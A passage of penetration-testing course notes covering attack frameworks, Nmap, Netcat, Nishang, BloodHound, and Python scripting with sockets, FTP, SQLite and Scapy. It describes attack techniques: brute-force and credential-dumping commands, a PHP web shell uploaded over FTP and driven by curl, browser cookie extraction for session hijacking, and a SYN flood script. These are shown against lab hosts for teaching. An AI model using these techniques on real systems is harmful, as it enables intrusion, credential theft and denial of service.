	• The cyber kill chain is a model introduced by Lockheed Martin (2009) that describes the stages of a cyberattack, from reconnaissance to final action. It provides a framework for defenders to understand, detect, and disrupt attacks at multiple points in their lifecycle.

	• Key Concepts

		○ Origins

			§ Introduced in Lockheed Martin’s paper “Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains”.

			§ Concept: Cyberattacks can be understood as a series of steps (a chain), and breaking any step can prevent the attack from succeeding.

		○ The Seven Stages of the Cyber Kill Chain

			§ Reconnaissance

				□ Attacker gathers information about the target.

				□ Techniques: scanning IP addresses, port scanning, mapping domains.

				□ Often automated using botnets.

			§ Weaponization

				□ Developing or acquiring malware tailored to the target.

				□ Example: custom exploits for a specific OS or website.

				□ Increasingly purchased on underground markets rather than coded by the attacker.

			§ Delivery

				□ Getting the malware to the victim.

				□ Methods: phishing emails, malicious websites, stolen/default credentials, infected flash drives.

			§ Exploitation

				□ Malware (or attacker) takes advantage of a vulnerability.

				□ Example: opening a malicious attachment, visiting an infected site, or unauthorized credential use.

			§ Installation

				□ Payload is installed on the victim’s system.

				□ Ensures persistence (e.g., Windows registry autorun).

				□ Creates a foothold for deeper attacks.

			§ Command and Control (C2)

				□ Compromised system contacts the attacker’s server to receive instructions.

				□ Enables remote control, data exfiltration, and continued exploitation.

			§ Actions on Objectives

				□ Final goal depending on attacker motives:

					® Hacktivists → deface websites.

					® State actors → steal sensitive info.

					® Cybercriminals → financial theft.

				□ Always harmful to the victim.

		○ Attack Characteristics

			§ Automation: Large-scale attacks rely on botnets.

			§ Beachheads: Often compromise an exposed host first, then move laterally.

			§ Exploitation methods: Often rely on human error (phishing, malicious documents).

			§ Persistence: Ensures continued access.

			§ Flexibility: C2 servers may change addresses to avoid detection.



The MITRE ATT\&CK Repository

	• The MITRE ATT\&CK framework is a globally accessible, continuously updated knowledge base of adversary tactics, techniques, and procedures (TTPs). It builds on the cyber kill chain concept but goes much deeper—detailing specific methods attackers use, along with detection, mitigation, and attribution information. It’s widely used for threat analysis, defense design, and cyber threat intelligence.

	• Key Concepts

		○ What MITRE ATT\&CK Is

			§ A repository of real-world cyberattack tactics and techniques observed in the wild.

			§ Covers the entire attack lifecycle, from reconnaissance through impact.

			§ Provides practical guidance for defenders to understand how adversaries operate.

		○ Structure

			§ Matrices: Organized by attack stages (12 in total).

				□ Example: External Remote Services under Initial Access shows methods of exploiting remote access points.

			§ Tactics: High-level goals attackers pursue (e.g., Persistence, Privilege Escalation, Collection).

			§ Techniques (and sub-techniques): Specific ways those goals are achieved.

				□ Example: T1123 – Audio Capture → malware can activate the microphone to eavesdrop.

		○ Detailed Information Provided

			§ For each technique, MITRE ATT\&CK includes:

				□ Description of how it works.

				□ Examples of threat actors or malware families using it.

				□ Mitigations: Defensive measures to reduce risk.

				□ Detection methods: Logs, monitoring, behavioral analytics.

				□ References: Links to research and incident reports.

		○ Threat Actor Groups

			§ ATT\&CK tracks known adversary groups and their associated TTPs.

			§ Example: Platinum → a group targeting governments and organizations in South and Southeast Asia.

			§ This helps in attribution and threat profiling.



#### Pen Testing Tools



Scanning networks with Nmap

	Nmap is a core penetration testing tool used to discover hosts, open ports, services, operating systems, and vulnerabilities on a network. It offers a wide range of scanning options that allow security testers to map out attack surfaces and assess system exposure.

	• Key Concepts

		○ Host Discovery

			§ nmap -sn 10.0.2.0/24 → ICMP ping sweep to identify live hosts.

			§ Only reports hosts that respond.

			§ Some hosts may not respond to ping, requiring other options.

		○ TCP Scanning

			§ -PS → TCP SYN scan (SYN ping).

				□ Sends a SYN packet; open ports reply with SYN-ACK.

				□ Connection is terminated before completion.

			§ Reveals which services/ports are open and accessible.

		○ Bypassing Ping Checks

			§ -P0 (or -Pn in newer versions) → Skip ping test.

				□ Useful for systems that block ICMP (e.g., firewalled hosts).

				□ Example: nmap -PS -P0 10.0.2.38.

		○ UDP Scanning

			§ -sU → Probes UDP ports (usually slower and requires root).

			§ Checks common 1,000 UDP ports.

			§ Example: sudo nmap -sU 10.0.2.32.

		○ Service \& Version Detection

			§ -sV → Identifies the version of software running on a port.

			§ -p → Specify a port or port range.

			§ Example: nmap -p22 -sV 10.0.2.32 → Finds OpenSSH 4.7p1.

		○ Combined TCP/UDP \& Custom Ports

			§ Example:

				sudo nmap -sSUV -p U:53,111,137,T:21-25,80,139,8080 10.0.2.32

			§ -sSUV → Scan both TCP/UDP + version detection.

			§ Custom port ranges for deeper analysis.

		○ OS Detection

			§ -O → Fingerprints target OS.

			§ Example: sudo nmap -O 10.0.2.32 → Correctly identifies Linux.

		○ Nmap Scripting Engine (NSE)

			§ Located in /usr/share/nmap/scripts.

			§ Adds advanced capabilities (brute force, vuln detection, malware discovery).

			§ Example:

				nmap --script=rexec-brute -p512 10.0.2.32

			§ Runs brute-force against Rexec service, extracting valid credentials.



A Netcat Refresher

	• Netcat (often called the Swiss Army knife of networking) is a versatile tool for sending, receiving, and manipulating data across networks. It supports functions like chat, file transfer, service interaction, and port listening, making it invaluable for network diagnostics, penetration testing, and system administration.

	• Key Concepts

		○ Fundamental Role

			§ Works as either a sender (client) or receiver (listener).

			§ Transfers raw data streams between systems.

			§ Installed by default in Kali Linux; widely available on other platforms.

		○ Chat / Raw Connection

			§ Listener setup: nc -lp 4545 (listen on port 4545).

			§ Client connection: nc <IP> 4545.

			§ Creates a simple two-way chat over TCP.

			§ Demonstrates Netcat’s ability to establish arbitrary raw connections.

		○ File Transfer

			§ Server/receiver: nc -lp 4545 > incoming.txt → saves incoming data into a file.

			§ Client/sender: nc <target IP> 4545 < myfile.txt → sends file contents.

			§ Allows simple one-line file transfer between systems.

		○ Connecting to Services

			§ HTTP:

				□ nc -v google.com 80 → connects to a web server.

				□ Manually send an HTTP request (e.g., GET /index.html HTTP/1.1).

			§ FTP:

				□ nc -v <IP> 21 → connects to an FTP server.

				□ Supports logging in, issuing commands, and interacting with the service directly.

			§ Shows Netcat as a flexible client for testing services.

		○ Options \& Flags

			§ -l → listen mode.

			§ -p → specify port.

			§ -v → verbose mode (connection feedback).

			§ Redirection (> and <) used for file input/output.

		○ Use Cases

			§ Ad-hoc communication between systems.

			§ Quick file transfer without FTP/HTTP setup.

			§ Testing services like HTTP and FTP at the raw protocol level.

			§ Troubleshooting and penetration testing, e.g., confirming open ports or service behaviors.



Capturing Packets with Tcpdump

	• Tcpdump is a command-line packet capture tool for analyzing network traffic. It allows penetration testers and defenders to inspect, filter, and diagnose network communications in real time. It’s lightweight, flexible, and highly customizable through expressions and filters.

	• Key Concepts

		○ Setup \& Modes

			§ Promiscuous mode: Needed to capture packets not addressed to the host (enabled in VM settings).

			§ Run with root privileges (sudo) for packet capture.

			§ tcpdump -D → List available interfaces.

			§ -i any → Capture from all interfaces.

			§ -c <n> → Limit number of packets captured.

		○ Basic Options

			§ -n → Suppress hostname resolution.

			§ -nn → Suppress both hostname \& port name resolution (shows raw IP:port).

			§ -t → Human-readable timestamps.

			§ -x → Show packet in hex + ASCII.

			§ -v, -vv, -vvv → Verbosity levels.

			§ -s → Set packet size displayed (-s0 = full packet).

		○ Filtering Expressions

			§ Types:

				□ host/net/port → e.g., host 10.0.2.38, net 10.0.2.0/24.

			§ Direction:

				□ src, dst → Source/destination filters.

			§ Protocols:

				□ tcp, udp, icmp, ip6, etc.

			§ Examples:

				□ tcpdump -i eth0 -c 10 host 10.0.2.38 → Capture traffic to/from host.

				□ tcpdump udp → Only UDP traffic.

				□ tcpdump dst port 443 → Destination HTTPS traffic.

				□ tcpdump portrange 1-1023 → Common system ports.

		○ Advanced Use

			§ Write capture: -w file.pcap → Save in PCAP format for Wireshark.

			§ Logical operators: and, or, parentheses.

				□ Example: (src 10.0.2.38 and (dst port 80 or dst port 443)).

			§ Flag filtering:

				□ Example: tcp\[13] \& 2 != 0 → Capture SYN packets.

				□ Example: tcp\[tcpflags] \& tcp-syn != 0.

			§ Banner matching:

				□ Search for services (e.g., SSH) by looking for specific text strings in packets.

		○ Diagnostics \& Security Use Cases

			§ Identify what services are running (e.g., SSH headers).

			§ Detect suspicious or malformed traffic (e.g., invalid flag combos like RST+SYN).

			§ Trace communication patterns (who is talking to whom).

			§ Gather evidence of attacks or service exploitation attempts.



Work with netstat, nbtstat, and arp

	• Netstat, nbtstat, and arp are fundamental network diagnostic tools. They allow administrators and security testers to observe connections, ports, processes, routing, and address resolution mappings, which is critical for identifying anomalies and potential security issues without deep packet analysis.

	• Key Concepts

		○ Netstat (Network Statistics)

			§ Purpose: Displays active network connections and protocol statistics.

			§ Basic usage:

				□ netstat → Lists current TCP connections.

			§ Key columns:

				□ Protocol (TCP/UDP), Local address + port, Foreign address, Connection state.

			§ Useful switches:

				□ -b → Show the executable/program creating the connection.

				□ -o → Show the process ID owning the connection/port.

				□ -a → Show all services (TCP/UDP), both established and listening.

				□ -rn → Show routing table and interface info in numeric IP form.

			§ Insight: Helps identify suspicious or unexpected connections, open listening ports, and services that may be exposed.

		○ ARP (Address Resolution Protocol)

			§ Purpose: Maps IP addresses to MAC addresses (link-layer identifiers).

			§ Basic usage:

				□ arp -a → Display ARP table (all entries).

				□ arp -s <IP> <MAC> → Add a static ARP entry.

			§ Security concern:

				□ ARP tables can be modified maliciously for Man-in-the-Middle (MITM) attacks.

				□ Monitoring ARP entries helps detect anomalies like spoofed MAC addresses.

		○ Nbtstat

			§ Purpose: Used on Windows to diagnose NetBIOS over TCP/IP connections.

			§ Usage:

				□ nbtstat -n → List local NetBIOS names.

				□ nbtstat -A <IP> → Query remote machine for NetBIOS names.

			§ Value: Identifies file-sharing services, NetBIOS names, and possible vulnerabilities in older Windows networks.



Scripting with PowerShell

	• PowerShell is Microsoft’s powerful command-line shell and scripting environment, serving as the Windows equivalent of Bash on Linux. It combines command-line utilities, scripting, and access to Windows system management (WMI). It’s essential for both administrators (automation, system control) and penetration testers (system inspection and exploitation).

	• Key Concepts

		○ What PowerShell Is

			§ Built into all modern Windows systems.

			§ Mixes command-line tools, scripting language features, and Windows Management Instrumentation (WMI) access.

			§ Used for automation, system administration, and penetration testing.

		○ Cmdlets

			§ PowerShell introduces cmdlets (command-lets), small specialized commands.

			§ Verb-Noun syntax (standardized format):

				□ Examples: Get-Help, Get-Process, Set-Service.

			§ Get-Verb → Lists available verbs (~98 verbs).

			§ Consistent, discoverable naming makes it easier to learn and script.

		○ Help System

			§ help <command> → Provides usage information.

			§ Example: help push shows Push-Location cmdlet.

			§ Full docs show purpose, parameters, and related commands.

		○ Compatibility with Standard Commands

			§ Supports Windows shell commands (e.g., cd, dir, ipconfig)

			§ Also supports some Linux-style commands (cat, redirection operators <, >).

		○ Scripting Basics

			§ Scripts saved as .ps1 files.

			§ Run scripts with prefix: .\\script.ps1.

			§ PowerShell ISE (Integrated Scripting Environment) provides GUI assistance (syntax highlighting, autocomplete).

			§ Variables use $ prefix.

			§ Lists (arrays) supported, with .count property for length.

		○ Programming Constructs

			§ Output: echo or Write-Host.

			§ Conditionals: if-then statements, multi-line syntax.

			§ Loops:

				□ do { } while()

				□ ForEach → cleaner for list iteration.

			§ Variable substitution in strings: variables inside strings expand automatically.

		○ Practical Uses

			§ Automating Windows administration tasks.

			§ Interfacing with WMI for deep system data.

			§ Running executables and scripts directly.

			§ Useful for penetration testers to query system state, processes, services, and exploit automation.



Extending PowerShell with Nishang

	• Nishang is a collection of offensive PowerShell scripts (cmdlets) created by Nikhil Mittal, widely used for penetration testing and red team operations. It extends PowerShell’s native capabilities, adding tools for information gathering, credential dumping, lateral movement, brute force, payload generation, and malware detection.

	• Key Concepts

		○ What Nishang Is

			§ A PowerShell exploitation framework.

			§ Available by default in Kali Linux, but can also be installed on Windows.

			§ Downloadable from GitHub (requires manual extraction).

			§ Must be run as Administrator, with antivirus protection often disabled (many scripts are flagged as malicious).

		○ Setup \& Loading

			§ Execution policy: Unsigned scripts need to be allowed.

			§ Unblocking scripts: Use Get-ChildItem (gci) to recursively unblock contents.

			§ Importing adds many new Nishang cmdlets into PowerShell.

		○ Core Capabilities

			§ Information Gathering

				□ Collects system data: users, hosts, installed software, drivers, interfaces, etc.

			§ Credential \& Hash Extraction

				□ Invoke-Mimikatz → Extracts credentials from memory.

				□ Get-PassHashes → Extracts password hashes.

			§ Port Scanning

				□ Identifies open ports for lateral movement.

			§ Payload Generation (Weaponization)

				□ Out-Word → Embeds payloads into Word documents.

				□ Other payload formats: Excel (Out-XL), Shortcuts (Out-Shortcut), Compiled HTML Help (Out-CHM), JavaScript (Out-JS).

			§ Brute Force Attacks

				□ Invoke-BruteForce → Runs dictionary attacks against services (e.g., FTP).

				□ Supports verbose mode and stopping on success.

			§ Malware Detection via VirusTotal

				□ Invoke-Prasadhak → Uploads process executables’ hashes to VirusTotal (requires API key).

				□ Helps verify whether running processes are malicious.

		○ Security \& Testing Implications

			§ For penetration testers: Extends PowerShell into a post-exploitation toolkit, enabling realistic adversary simulations.

			§ For defenders: Highlights how attackers may abuse PowerShell and Nishang for lateral movement and persistence.

			§ Detection: Many commands overlap with known attacker TTPs (aligned with MITRE ATT\&CK).



What is Active Directory?

	• Active Directory (AD) is Microsoft’s LDAP-compliant identity and domain management system, central to most enterprise networks. It manages identities, access, policies, and trust relationships across complex organizational structures. Understanding AD is crucial for both administrators and penetration testers because it is a common target in attack chains.

	• Key Concepts

		○ Active Directory Domain Services (AD DS) is the full name.

		○ Provides much more than an LDAP directory:

			§ Identities (users, groups, services).

			§ Domain management (policies, security, replication).

			§ Centralized authentication and authorization.

		○ Core Components

			§ AD Objects: Users, computers, groups, policies, etc.

			§ Schema: Defines AD objects and their attributes.

			§ Catalog: Hierarchical structure (containers for browsing/searching objects).

			§ Group Policy Objects (GPOs): Centralized configuration for users/computers.

			§ Replication Service: Synchronizes data across domain controllers.

			§ Security system: Controls authentication and access within domains.

		○ Hierarchical Structure

			§ Realm: The full enterprise scope.

			§ Forests: Independent groups of domains (each a security boundary).

				□ One org = one forest, or multiple for conglomerates/business units.

			§ Domains: Logical groupings of AD objects (users, machines, etc.).

			§ Subdomains: Nested hierarchies (domain → subdomain → sub-subdomain).

			§ Sites: Sub-hierarchy reflecting physical network topology.

				□ Important for replication and group policy application.

				□ Policies apply in order: domain → site → local machine.

		○ Trust Relationships

			§ Required for replication between domains.

			§ Enable cross-domain access (users in one domain querying another).

			§ Critical for enterprise-wide authentication and collaboration.

		○ Practical Relevance

			§ AD structures often mirror real-world business organization (domains, subdomains, forests).

			§ Tools like DMitry can reveal public subdomains (e.g., yahoo.com → ca.yahoo.com, uk.yahoo.com).

			§ AD is a frequent attack target, since compromising domain controllers can yield enterprise-wide access.

			§ Essential knowledge for penetration testers and defenders.



Analyzer Active Directory with BloodHound

	• Bloodhound is a tool used in penetration testing to map out relationships and privilege paths in Active Directory (AD) environments. It helps testers (and attackers) identify how a standard domain user could escalate privileges to become a domain administrator by analyzing AD objects and permissions.

	• Key Concepts

		○ Purpose of BloodHound

			§ Identifies privilege escalation paths in AD.

			§ Maps users, groups, permissions, and trust relationships.

			§ Useful for penetration testers to plan escalation from low-privileged accounts to high-value targets (e.g., domain admins).

		○ How BloodHound Works

			§ Data Collection:

				□ Requires a domain user account to query AD.

				□ Uses BloodHound-python (or other collectors) to gather data.

				□ Collector outputs JSON files with AD structure.

			§ Data Analysis:

				□ Data imported into BloodHound, which uses a Neo4j graph database.

				□ Relationships between users, groups, and permissions are visualized.

				□ Analysts can run queries and built-in analytics to find escalation opportunities.

		○ BloodHound Setup

			§ Obtain domain user credentials (in example: jdoe76 / JDPass2021).

			§ Run bloodhound-python with domain, username, password, and name server to extract AD data.

			§ Start Neo4j (graph database backend).

			§ Load JSON data into BloodHound GUI.

		○ Analysis Examples

			§ Path Finding:

				□ Can search for paths from a given user to Domain Admins@<domain>.

				□ Example: user AKATT42 → found to be a member of Domain Admins.

			§ Built-in Analytics:

				□ List all Domain Admins → identifies accounts with highest privileges.

				□ List all Kerberoastable Accounts → service accounts vulnerable to Kerberos ticket extraction.

				□ Find AS-REP Roastable Users → accounts without Kerberos pre-authentication (easily brute-forced)

			§ These help uncover stepping stones toward escalation.

		○ Why It Matters

			§ BloodHound is especially effective in large, complex AD environments where manual privilege mapping is impractical.

			§ It provides defenders and testers with visibility of privilege pathways attackers could exploit.

			§ Helps prioritize which accounts to protect (e.g., vulnerable service accounts, non-preauth accounts, or domain admins).



#### Bash Scripting





Refreshing Your Bash Skills

	• Bash is a core Linux shell and scripting language. It allows automation of tasks, command execution, and user interaction through scripts (.sh files). For penetration testers (and system administrators), refreshing Bash scripting skills is important for building quick utilities, automating tests, and handling command-line workflows.

	• Key Concepts

		○ Bash Basics

			§ Shell scripts are text files with a .sh extension.

			§ First line typically declares the interpreter (shebang: #!/bin/bash).

			§ Scripts must be made executable with chmod +x filename.sh.

			§ Execution: ./filename.sh.

		○ Hello World Example

			§ Classic example script (hello.sh) assigns a string variable and prints it.

			§ Demonstrates how Bash executes commands in sequence.

		○ Command-Line Arguments

			§ $1, $2, etc. → Positional parameters for arguments passed to the script.

			§ Example (argue.sh): two arguments combined to print "Hello World".

			§ Useful for writing scripts that adapt based on user input.

		○ Variables and Arithmetic

			§ Variables are untyped in Bash.

			§ Arithmetic operations use double bracket syntax (( )).

			§ Example (variables.sh):

				• Takes input from command-line.

				• Compares values with constants.

				• Performs numeric addition.

		○ Reading User Input

			§ read command → captures input from the terminal.

			§ Can prompt with echo, or inline prompt (read -p).

			§ Example (reader.sh): reads a name and prints a message using it.

			§ Demonstrates interactive scripting.



Controlling the Flow in a Script

	• Bash provides flow control statements (loops and conditionals) that allow scripts to make decisions and repeat tasks. These constructs make Bash scripting more powerful, flexible, and capable of handling real-world automation and penetration testing workflows.

	• Key Concepts

		○ For Loops

			§ Example (fortest.sh):

				• Uses array length (^ or ${#array\[@]}) to determine loop range.

				• First array element index = 0.

				• Syntax: ${i} used as the array index inside the loop.

			§ Prints out list of array elements sequentially.

		○ While Loops

			§ Executes code repeatedly while a condition is true.

			§ Example (wutest.sh):

				• Starts index at 6.

				• Decrements index until it is no longer greater than 0.

			§ Demonstrates countdown behavior.

		○ Until Loops

			§ Opposite of while. Runs until a condition becomes true.

			§ Example:

				• Starts index at 1

				• Increments until index is greater than 6.

			§ Demonstrates counting upward.

		○ If-Else Statements

			§ Enable conditional execution based on tests.

			§ Example (iftest.sh):

				• Uses -d operator to check if a directory exists.

				• If it exists → print confirmation + list contents.

				• If not → display “doesn’t exist” message.

			§ Example results:

				• iftest.sh barney → directory missing.

				• iftest.sh /usr/share/Thunar → directory exists, contents listed.



Using Functions in Bash

	• Bash allows the creation and use of functions within scripts, making them more modular, reusable, and easier to maintain. Functions can also be combined with control structures like case statements and select menus to build interactive, flexible scripts.

	• Key Concepts

		○ Functions in Bash

			§ Defined with a function name followed by {} enclosing commands.

			§ Can accept parameters (e.g., $1 for the first argument).

			§ Promote code reuse and better script structure.

			§ Example: A function that takes a city name and outputs language advice.

		○ Operators in Bash

			§ String comparisons/assignments: Single equals sign =.

			§ Numeric comparisons: Double equals ==.

			§ Knowing the difference prevents logic errors in scripts.

		○ Select Statement

			§ Provides a menu-driven interface in Bash.

			§ Automatically loops until a break condition is met.

			§ Works with the PS3 variable (prompt string), e.g., PS3=">"

		○ Case Statement

			§ Used to handle different menu selections or conditions.

			§ Cleaner and more readable than nested if statements.

			§ Works well with select for handling menu-driven choices.

		○ Practical Example

			§ Script (fntest.sh) combines:

				□ A function (speak) → checks a city and outputs the language spoken.

				□ A select menu → lets the user choose a city.

				□ A case statement → maps city to country.

				□ A function call → outputs language info after the country is printed.

			§ Demo outputs:

				□ Choosing Melbourne → “Australia, Language: English.”

				□ Choosing Paris → “France, Language: French.”

				□ Choosing Hanoi → “Vietnam, Language: Vietnamese + French/English.”

				□ Choosing Asmara → “Eritrea, try English (louder).”



#### Python Scripting



Refresh your Python Skills

	• Python is an interpreted, cross-platform programming language widely used for automation, penetration testing, and scripting. This refresher highlights its core syntax, data structures, and flow control mechanisms that are especially useful for pen testers and system administrators.

	• Key Concepts

		○ Python Basics

			§ Interpreted language: Runs line by line in an interpreter (e.g., python in terminal).

			§ Available for Windows and Linux (pre-installed on most Linux distros like Kali).

			§ Scripts are plain text files (e.g., hello.py) run with python script.py.

			§ Different versions exist (e.g., Python 2 vs Python 3), so compatibility matters when reusing scripts.

		○ Data Types \& Variables

			§ Python is dynamically typed: variable type is set by assignment.

			§ Common types:

				□ Integer (8080)

				□ Float (12.43)

				□ Boolean (True/False)

				□ String ("Malcolm")

			§ Type can be checked with type(variable).

			§ Supports normal operators (math, string concatenation).

		○ Collections

			§ Lists (\[ ]): Ordered sequences, indexed starting at 0.

				□ Example: activehost = \[], then .append("10.0.2.8").

				□ Access elements with \[index].

			§ Dictionaries ({ }): Key-value pairs.

				□ Example: hostname = {"173.23.1.1": "munless.com.ch"}.

				□ Keys map to values, can be updated with .update().

				□ Looping: for key in hostname: print(key, hostname\[key]).

		○ Conditionals

			§ If/Else statements: Used for logic.

				□ Example:

					numb = 5

					if numb < 10:

					    print("Single digit value")

				□ Indentation is critical—Python uses whitespace to define scope.

		○ Loops

			§ For loops: Iterates over ranges or sequences.

				□ Example: for x in range(1,5): print("Repetition " + str(x)) → runs 1 to 4.

			§ While loops: Repeat until condition fails (not deeply covered in transcript here).

		○ String Functions

			§ Built-in string manipulation:

				□ .upper() → uppercase.

				□ .lower() → lowercase.

				□ .replace(old,new) → replace substrings.

				□ .find(substring) → find position of substring.

			§ Demonstrates Python’s extensive standard library functions.

		○ Practical Relevance for Pen Testing

			§ Network programming (e.g., sockets, requests) is heavily used.

			§ Lists/dictionaries are ideal for managing hosts, credentials, and services.

			§ Conditionals and loops automate repetitive testing tasks.

			§ Strong library support makes Python flexible for security scripting.



Use the System Functions

	• Python can be extended with system and third-party libraries, which allow scripts to interact with the operating system and external commands. Two important libraries for penetration testers and system administrators are os (built-in system calls) and subprocess (running external commands).

	• Key Concepts

		○ OS Library

			§ Purpose: Provides access to operating system–level information and functions.

			§ Example:

				import os

				os.uname()

			§ Returns details about the OS (name, version, release, etc.).

			§ Useful for gathering environment/system details within scripts.

		○ Subprocess Library

			§ Purpose: Runs external system commands directly from Python.

			§ Example Script (sprog.py):

				import subprocess

				

				# Run uname -V and display results

				subprocess.run(\["uname", "-V"])

				

				# Run uname -ORS, capture result, and decode output

				result = subprocess.run(\["uname", "-oRS"], capture\_output=True)

				print(result.stdout.decode())

			§ Allows both execution (displaying results directly) and capturing output for later processing.

			§ Common in penetration testing for automating system enumeration or integrating system tools into larger scripts.

		○ Why These Libraries Matter

			§ They extend Python beyond its core language, bridging into the OS environment.

			§ Enable automation of system tasks like:

				□ Gathering OS metadata.

				□ Running and chaining command-line tools.

				□ Capturing output for analysis.

			§ Reduce the need for reinventing solutions—many tasks can be done by wrapping existing system utilities.

				



Use Networking Functions

	• Python’s socket module provides low-level networking capabilities, allowing penetration testers to write custom tools for banner grabbing, port scanning, and host reconnaissance. While tools like Nmap already exist, building simple scanners in Python helps understand how network communication works and gives flexibility in testing.

	• Key Concepts

		○ The Socket Module

			§ Importing: import socket to access networking functions.

			§ Configuration:

				□ Set defaults like timeout (socket.setdefaulttimeout(1)).

			§ Creating a socket: socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) for TCP.

			§ Basic use case: Connect to a host/port and receive data.

		○ Banner Grabbing (banftp.py)

			§ Connects to a specific service (FTP on port 21).

			§ Example steps:

				□ Import socket.

				□ Set timeout to 1 second.

				□ Connect to 10.0.2.32:21.

				□ Receive up to 1024 bytes (recv(1024)).

				□ Decode and print the banner.

			§ Purpose: Quickly identify services and versions running on a host.

		○ Simple Port Scanner (portscan.py)

			§ Goal: Identify open TCP ports on a host.

			§ Implementation:

				□ Takes IP address as a command-line argument (sys.argv).

				□ Loops through port range 1–1023.

				□ Tries to connect to each port inside a try/except block.

				□ If connection succeeds → prints port as open.

			§ Demonstrates how scanners work under the hood.

			§ Example run: python portscan.py 10.0.2.32.

		○ Why Build Custom Tools?

			§ Learning value: Understand sockets, connections, and service banners.

			§ Flexibility: Customize for unusual cases (e.g., proprietary services).

			§ Simplicity: Useful for quick checks without large tools like Nmap.

			§ Stealth: Custom scripts may bypass defenses tuned to detect standard tools.



Work with Websites

	• Website penetration testing often requires manual interaction beyond automated tools. Python provides libraries to interact with websites, FTP servers, and file uploads, which can be leveraged to detect vulnerabilities and even execute attacks such as remote code execution (RCE).

	• Key Concepts

		○ Retrieving Web Pages

			§ Library used: urllib.

			§ Example script (useurl.py):

				• Send request to open a webpage (index page).

				• Decode and print HTML.

			§ Purpose: Gain direct access to raw page code for analysis.

		○ Interacting with FTP Servers

			§ Library used: ftplib.

			§ Example script (useftp.py):

				• Connect to FTP server with credentials.

				• Change directory to /var/www (web root).

				• List directory contents with .dir().

			§ Observation: Found a DAV webpage with world-write permissions, which signals a potential vulnerability.

		○ Exploiting Writable Web Directories

			§ Attack method: Uploading a malicious PHP web shell.

			§ Example:

				• PHP file (Shelly.php) → executes commands from URL.

				• Python script (webinject.py) → logs in via FTP, switches to vulnerable folder, and uploads Shelly.php using storbinary.

			§ Outcome: Attacker has a backdoor on the webserver.

	• Command Execution via Web Shell

		○ Once uploaded, the PHP shell can be triggered via a browser or curl.

		○ Example with curl:

			curl http://10.0.2.32/DAV/Shelly.php?cmd=ls%20/home%20-l

			§ %20 = URL-encoded space.

			§ Executes ls -l /home remotely and returns results.

		○ Why This Matters

			§ Demonstrates common real-world attack chain:

				• Reconnaissance → Identify web/FTP server.

				• Enumeration → Detect misconfigurations (writable web folders).

				• Exploitation → Upload malicious file.

				• Post-exploitation → Achieve remote code execution.

			§ Highlights importance of file permissions, FTP security, and input sanitization in web environments.



Access SQLite Databases

	• SQLite databases are commonly encountered during penetration testing (e.g., browser storage, mobile apps). Python’s sqlite3 library provides a simple way to automate interaction with SQLite databases for enumeration and data extraction.

	• Key Concepts

		○ Where SQLite Appears

			§ Found in many applications (browsers, mobile devices, local apps).

			§ Example: Google Chrome uses an SQLite database called Cookies to store session cookies.

			§ Pen testers often target these databases to extract sensitive data (sessions, tokens, credentials).

		○ Connecting to SQLite with Python

			§ Library: sqlite3 (built-in to Python).

			§ Steps:

				□ Import sqlite3.

				□ Connect to the database file (e.g., cookies).

				□ Create a cursor and execute SQL queries.

				□ Fetch and display results.

		○ Database Exploration

			§ Step 1 – List Tables (squeal1.py):

				□ Run query against SQLite master config:

				SELECT name FROM sqlite\_master WHERE type='table';

				□ Revealed tables: meta and cookies.

			§ Step 2 – List Columns (squeal2.py):

				□ Select all fields from cookies table to get column metadata.

				□ Identified the structure of stored cookie data.

			§ Step 3 – Extract Data (squeal3.py):

				□ Query specific fields (e.g., host/site name and cookie value).

				□ Print formatted output for readability.

				□ Produces a list of cookies stored by the browser.

		○ Why This Matters for Pentesting

			§ Cookies can contain session tokens, authentication info, and persistent logins.

			§ Extracting them may allow:

				□ Session hijacking (reuse of session IDs).

				□ Bypassing authentication if tokens are still valid.

			§ SQLite analysis provides insight into how applications store sensitive data locally.



Using Scapy to work with packets

	• Scapy is a powerful Python library for crafting and sending raw network packets. It allows penetration testers to build packets at any layer, customize their fields, and send them directly to a target—making it useful for testing, probing, and simulating attacks such as SYN floods.

	• Key Concepts

		○ What Scapy Is

			§ A Python-based packet manipulation tool.

			§ Can be used interactively (as a CLI) or imported as a library inside scripts.

			§ Provides control over network layers (Ethernet, IP, TCP, UDP, ICMP, etc.).

			§ Let's testers create, modify, send, and sniff packets.

		○ Creating Packets

			§ With Scapy, you can:

				□ Define each layer of a packet (e.g., IP, TCP).

				□ Set fields manually (source/destination IP, ports, flags).

			§ Example in transcript: building TCP SYN packets with defined source/destination IPs and ports.

		○ Example: SYN Flood Script (spack.py)

			§ Routine:

				□ Loops across a range of ports on the target.

				□ Creates TCP packets with the SYN flag set.

				□ Sends them rapidly to overwhelm the target.

			§ Demonstrates DoS principles (though a simple, not optimized, flood).

			§ Execution: sudo python spack.py (requires privileges to send raw packets).

		○ Why Scapy Matters

			§ Useful for penetration testers to:

				□ Simulate attacks (e.g., floods, scans).

				□ Probe systems in custom ways (not just default Nmap-style scans).

				□ Test how a target responds to crafted/malformed packets.

			§ Provides deep flexibility compared to pre-built tools.



Leveraging OpenAI for testing

	• AI tools like OpenAI can be integrated into penetration testing workflows to assist with automation, code generation, and intelligence gathering. By programmatically accessing the OpenAI API, testers can dynamically generate scripts, queries, and security insights that complement traditional tools.

	• Key Concepts

		○ Setting Up OpenAI

			§ Requires an OpenAI account and an API key (free to obtain).

			§ Install Python library:

				sudo pip3 install openai

			§ In scripts, import both openai and os libraries.

			§ Authenticate with your API key before making requests.

		○ Writing a Python Script (myai.py)

			§ Steps in the example script:

				□ Import libraries.

				□ Initialize OpenAI with the API key.

				□ Prompt user for input (e.g., a question or task).

				□ Configure query for GPT model (e.g., GPT-3.5 Turbo).

				□ Specify context/role (e.g., “university lecturer”).

				□ Send query and print the AI’s response.

		○ Practical Testing Examples

			§ Code generation:

				□ Asked for a Python port scanner → OpenAI produced script.

				□ Asked for a PowerShell script to enumerate SMB services → OpenAI provided one.

			§ Threat intelligence:

				□ Queried information on APT28 (Fancy Bear/Sofacy).

				□ Received background, aliases, and activity details.

		○ Why This Matters for Pen Testing

			§ Accelerates scripting: Quickly generate working code for common tasks.

			§ Broad coverage: Handles multiple languages (Python, PowerShell, etc.).

			§ Threat research: Can provide summaries of adversaries, mapped to MITRE ATT\&CK.

			§ Flexibility: Answers depend on the specificity of the query—better prompts yield better results.



#### Kali and Metasploit



A Kali Refresher

	• Kali Linux is a specialized penetration testing distribution. Before using it for security testing, testers should refresh themselves on basic configuration, updates, and built-in tools like macchanger and searchsploit. These ensure the environment is prepared, anonymized when needed, and equipped for vulnerability research.

	• Key Concepts

